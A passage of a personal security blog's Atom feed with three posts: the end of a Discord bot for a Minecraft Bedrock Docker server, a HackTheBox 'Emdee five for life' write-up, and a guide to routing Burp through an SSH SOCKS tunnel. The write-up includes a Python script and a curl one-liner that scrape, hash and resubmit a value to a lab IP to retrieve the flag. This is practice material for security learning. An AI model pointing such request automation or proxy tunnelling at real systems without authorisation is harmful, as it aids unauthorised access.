&#123;&#125;&quot;</span>.<span class="built_in">format</span>(server,port,datas[<span class="string">&#x27;ServerName&#x27;</span>],datas[<span class="string">&#x27;PlayerCount&#x27;</span>],datas[<span class="string">&#x27;PlayerLimit&#x27;</span>],datas[<span class="string">&#x27;GameMode&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!stats&#x27;</span>):</span><br><span class="line">           stream = os.popen(<span class="string">&#x27;docker stats --no-stream --format &quot;table &#123;&#123;.Container&#125;&#125;\t&#123;&#123;.CPUPerc&#125;&#125;\t&#123;&#123;.MemUsage&#125;&#125;&quot; Minecraft&#x27;</span>)</span><br><span class="line">           out = stream.read()</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(out)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!setDay&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;time set day^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set time to [day]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!setNight&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;time set night^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set time to [night]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!normal&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;difficulty normal^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set difficulty to [normal]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!hard&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;difficulty hard^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set difficulty to [hard]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!thunder&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;weather thunder^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set weather to [thunder]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!sun&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;weather clear^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set weather to [clear]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!help&#x27;</span>):</span><br><span class="line">           msg = <span class="string">&quot;Prefix cmd with &lt;!&gt; \nserver : show server info \nstats : show server stat \nsetDay : set day \nsetNight : set night \nnormal : set difficulty to normal \nhard : set difficulty to hard \nthunder : set weather to thunder \nsun : set weather to sun\nopAdmin : set User operator \ndeOpAdmin : remove User operator \ncreativeAdmin : set creative mode to User \nsurvieAdmin : set survie mode to User&quot;</span></span><br><span class="line">           <span class="keyword">await</span> message.channel.send(msg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!opAdmin&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;op MicrosoftGameName^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set operator [MicrosoftGameName]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!deOpAdmin&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;deop MicrosoftGameName^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set deoperator [MicrosoftGameName]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!creativeAdmin&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;gamemode 1 MicrosoftGameName^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set gamemode [creative MicrosoftGameName]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message.content.startswith(<span class="string">&#x27;!survieAdmin&#x27;</span>):</span><br><span class="line">           os.popen(<span class="string">&#x27;screen -S Minecraft -p 0 -X stuff &quot;gamemode 0 MicrosoftGameName^M&quot;&#x27;</span>)</span><br><span class="line">           <span class="keyword">await</span> message.channel.send(<span class="string">&#x27;set gamemode [survie MicrosoftGameName]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">my_background_task</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">await</span> self.wait_until_ready()</span><br><span class="line">        oldLines = []</span><br><span class="line">        channel = self.get_channel(YourChannelID) <span class="comment"># channel ID goes here</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.is_closed():</span><br><span class="line">            currentLines = []</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;/var/log/dockerMinecraftLast.log&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">            lines = f.readlines()</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">                m = re.search(<span class="string">r&quot;Player (connected|disconnected): ([a-zA-Z0-9]&#123;1,&#125;), xuid: ([0-9]&#123;1,&#125;)&quot;</span>,line)</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    currentTime = datetime.datetime.now() + datetime.timedelta(hours=<span class="number">2</span>)</span><br><span class="line">                    prettyTime = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(currentTime.hour,currentTime.minute)</span><br><span class="line">                    log = <span class="string">&quot;[&#123;&#125;] &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(prettyTime,m.group(<span class="number">2</span>),m.group(<span class="number">1</span>))</span><br><span class="line">                    currentLines.append(log)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> current <span class="keyword">in</span> currentLines:</span><br><span class="line">                <span class="keyword">if</span> current <span class="keyword">not</span> <span class="keyword">in</span> oldLines:</span><br><span class="line">                    <span class="keyword">await</span> channel.send(current)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">60</span>) <span class="comment"># task runs every 60 seconds</span></span><br><span class="line">            oldLines = currentLines</span><br><span class="line"></span><br><span class="line">client = MyClient()</span><br><span class="line">client.run(<span class="string">&#x27;YOUR DISCORD KEY&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bdsPing.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">server=<span class="string">&#x27;YourServerIp&#x27;</span></span><br><span class="line">port=<span class="number">19132</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bdsPing</span>(<span class="params">server,port</span>):</span></span><br><span class="line">        <span class="comment">#Ping</span></span><br><span class="line">        bytesToSend = <span class="string">b&#x27;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">        serverAddressPort = (server,port)</span><br><span class="line">        bufferSize = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create a UDP socket at client side</span></span><br><span class="line">        UDPClientSocket = socket.socket(family=socket.AF_INET, <span class="built_in">type</span>=socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send to server using created UDP socket</span></span><br><span class="line">        UDPClientSocket.sendto(bytesToSend, serverAddressPort)</span><br><span class="line"></span><br><span class="line">        msgFromServer = UDPClientSocket.recvfrom(bufferSize)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#msg = &quot;Message from Server &#123;&#125;&quot;.format(msgFromServer[0])</span></span><br><span class="line">        data = msgFromServer[<span class="number">0</span>][<span class="number">35</span>:].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        indexes = [<span class="string">&#x27;Game&#x27;</span>,<span class="string">&#x27;ServerName&#x27;</span>,<span class="string">&#x27;ProtocolVersion&#x27;</span>,<span class="string">&#x27;ServerVersion&#x27;</span>,<span class="string">&#x27;PlayerCount&#x27;</span>,<span class="string">&#x27;PlayerLimit&#x27;</span>,<span class="string">&#x27;ServerId&#x27;</span>,<span class="string">&#x27;WorldName&#x27;</span>,<span class="string">&#x27;GameMode&#x27;</span>,<span class="string">&#x27;NintendoLimited&#x27;</span>,<span class="string">&#x27;Ipv4Port&#x27;</span>,<span class="string">&#x27;Ipv6Port&#x27;</span>]</span><br><span class="line">        datas = data[:-<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">        out = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indexes)):</span><br><span class="line">                out[indexes[i]] = datas[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">        <span class="comment">#return json.dumps(out)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        print(bdsPing(server,port))</span><br></pre></td></tr></table></figure><p>To run the bot in background start it in a screen session.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">screen -S BdsBot</span><br><span class="line">python3 bot.py</span><br><span class="line">CTRL+A CTRL+D</span><br></pre></td></tr></table></figure><p><img src="/2020/12/23/Create-a-discord-bot-for-minecraft-bedrock-docker/bot-example.png" alt="bds bot screen example"></p><p>enjoy ;)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/12/23/Create-a-discord-bot-for-minecraft-bedrock-docker/BDS-discord-header.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; </summary>
      
    
    
    
    
    <category term="discord" scheme="https://0x25.github.io/tags/discord/"/>
    
    <category term="docker" scheme="https://0x25.github.io/tags/docker/"/>
    
    <category term="minecraft" scheme="https://0x25.github.io/tags/minecraft/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox challenge web Emdee five for life</title>
    <link href="https://0x25.github.io/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/"/>
    <id>https://0x25.github.io/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/</id>
    <published>2020-12-05T14:49:49.000Z</published>
    <updated>2020-12-05T15:47:49.235Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/HTB-header.jpeg"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Solving web challenge (<strong>Emdee five for life</strong>) from <a href="https://hackthebox.eu/">Hackthebox.eu</a><br>It is not really a hacking challenge but a coding challenge ;)  </p><h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><p>Access the web page give us this page  </p><p><img src="/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/Emdee-five-for-life.png" alt="Screen"></p><p>We need to <del>encrypt</del> hash the text very fast.  </p><p>Get information of the query with Burp:<br><img src="/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/Emdee-five-for-life-Burp.png" alt="Burp"><br>We see that the page have a session. So we need to store this information before we send the query back.</p><p><strong>Step to solve the challenge</strong>:  </p><ul><li>grep the page and the session</li><li>extract the value to hash</li><li>hash the value</li><li>send it back to the server with the session ID</li></ul><h1 id="Lets-code-this"><a href="#Lets-code-this" class="headerlink" title="Lets code this"></a>Lets code this</h1><p>It is possible to code this in several languages.<br>Try it in python3</p><details>  <summary>Spoiler warning</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://134.209.29.219:31621/&quot;</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;h3 align=\&#x27;center\&#x27;&gt;([0-9a-zA-Z]&#123;1,&#125;)&lt;/h3&gt;&lt;center&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment">#print(&quot;# HTML code page:&quot;)</span></span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    m = re.search(pattern,r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> m.group(<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#print(&quot;# Extract value [&#123;&#125;]&quot;.format(m.group(1)))</span></span><br><span class="line">        md5_value = hashlib.md5(m.group(<span class="number">1</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(&quot;# MD5 value [&#123;&#125;]&quot;.format(md5_value))</span></span><br><span class="line"></span><br><span class="line">        x = s.post(url, data = &#123;<span class="string">&#x27;hash&#x27;</span>: md5_value, <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>&#125;)</span><br><span class="line">        print(x.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;regex error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;http error&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><p>output<br><img src="/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/Emdee-five-for-live-Python.png" alt="Shell output"></p><h1 id="Bash-online"><a href="#Bash-online" class="headerlink" title="Bash online"></a>Bash online</h1><p>Just for the fun, and to show that bash is often helpfull :)</p><details>  <summary>Spoiler warning</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -q -b /tmp/cookies.txt -d <span class="built_in">hash</span>=$(<span class="built_in">echo</span> -ne $(curl -q -s -c /tmp/cookies.txt http://134.209.29.219:31637/ | grep -oE <span class="string">&quot;[0-9a-zA-Z7]&#123;20&#125;&quot;</span>) | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>) http://134.209.29.219:31637 | grep -oE <span class="string">&quot;HTB&#123;.*&#125;&quot;</span> </span><br></pre></td></tr></table></figure></details>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/12/05/HackTheBox-challenge-web-Emdee-five-for-life/HTB-header.jpeg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="hackthebox" scheme="https://0x25.github.io/tags/hackthebox/"/>
    
    <category term="web" scheme="https://0x25.github.io/tags/web/"/>
    
    <category term="challenge" scheme="https://0x25.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>Configure proxy Socks in Burp</title>
    <link href="https://0x25.github.io/2020/11/27/Configure-proxy-Socks-in-Burp/"/>
    <id>https://0x25.github.io/2020/11/27/Configure-proxy-Socks-in-Burp/</id>
    <published>2020-11-27T13:05:02.000Z</published>
    <updated>2020-11-27T13:12:40.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Using an external server (VPS…) to output your burp traffic.  </p><p><img src="/2020/11/27/Configure-proxy-Socks-in-Burp/BurpSocks.png" alt="Burp Socks"></p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>First open a socks connection between your laptop and the remote server</p><figure class="highlight plain"><figcaption><span>[shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 -q -C -N -f -i &#x2F;home&#x2F;user&#x2F;.ssh&#x2F;rsa.pkey user@189.10.201.210 -p 22</span><br></pre></td></tr></table></figure><p>This will open a local connection at 127.0.0.1:1080.  </p><ul><li>-D open a SOCKS proxy on local port</li><li>-C compress data</li><li>-q quiet mode</li><li>-N do not execute remote commands (forward only)</li><li>-i path to ssh key</li><li>user@IP user and IP (to connect to)</li><li>-p remote SSH port</li></ul><p>you can use “netstat” to check if port is listen<br><img src="/2020/11/27/Configure-proxy-Socks-in-Burp/netstatSocks.PNG" alt="Netstat Socks"></p><h1 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h1><p>configure burp to use the socks proxy  </p><p>in <strong>Project options</strong> tab  </p><p><img src="/2020/11/27/Configure-proxy-Socks-in-Burp/burpConfigSocks.PNG" alt="Netstat Socks"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;headerlink&quot; title=&quot;Purpose&quot;&gt;&lt;/a&gt;Purpose&lt;/h1&gt;&lt;p&gt;Using an external server (VPS…) to output your bur</summary>
      
    
    
    
    
    <category term="burp" scheme="https://0x25.github.io/tags/burp/"/>
    
    <category term="socks" scheme="https://0x25.github.io/tags/socks/"/>
    
  </entry>
  
</feed>
